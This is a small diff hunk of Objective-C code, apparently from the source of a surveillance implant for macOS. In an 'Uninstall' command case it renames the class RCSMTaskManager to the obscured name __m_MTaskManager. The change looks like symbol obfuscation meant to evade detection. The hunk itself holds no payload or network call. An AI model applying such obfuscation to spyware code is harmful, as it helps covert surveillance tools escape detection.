@@ -305,7 +305,7 @@
         infoLog(@"Uninstall");
 #endif
 
-        RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+        __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
         [taskManager uninstallMeh];
       } break;
     case PROTO_NO:
